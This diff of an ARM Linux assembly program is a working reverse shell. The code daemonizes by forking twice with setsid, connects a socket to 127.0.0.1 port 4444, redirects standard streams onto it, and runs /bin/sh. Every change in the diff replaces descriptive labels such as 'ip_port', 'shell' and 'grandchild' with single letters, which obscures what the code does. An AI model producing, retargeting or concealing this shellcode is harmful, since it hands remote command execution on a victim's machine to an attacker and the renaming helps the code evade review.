@@ -1,12 +1,12 @@
 .section .rodata
 .align 4
-ip_port:
+z:
 	.byte 0x02, 0x00
 	.byte 0x11, 0x5C
 	.byte 127, 0, 0, 1
 	.space 8
 
-shell:
+s:
 	.ascii "/bin/sh\0"
 .section .text
 .global _start
@@ -21,15 +21,15 @@ _start:
 	mov r7, #2
 	svc #0
 	cmp r0, #0
-	bgt parent_first_fork
-child_first_fork:
+	bgt p
+f:
 	mov r7, #112
 	svc #0
 	mov r7, #2
 	svc #0
 	cmp r0, #0
-	bgt parent_second_fork
-grandchild:
+	bgt e
+g:
 	mov r0, #2
 	mov r1, #1
 	mov r2, #0
@@ -37,7 +37,7 @@ grandchild:
 	svc #0
 	mov r4, r0
 	mov r0, r4
-	ldr r1, =ip_port
+	ldr r1, =z
 	mov r2, #16
 	mov r7, #283
 	svc #0
@@ -51,7 +51,7 @@ grandchild:
 	mov r1, #2
 	mov r7, #63
 	svc #0
-	ldr r0, =shell
+	ldr r0, =s
 	mov r1, #0
 	mov r2, #0
 	mov r7, #11
@@ -59,11 +59,11 @@ grandchild:
 	mov r0, #1
 	mov r7, #1
 	svc #0
-parent_second_fork:
+e:
 	mov r0, #0
 	mov r7, #1
 	svc #0
-parent_first_fork:
+p:
 	mov r0, r0
 	mov r7, #7
 	svc #0
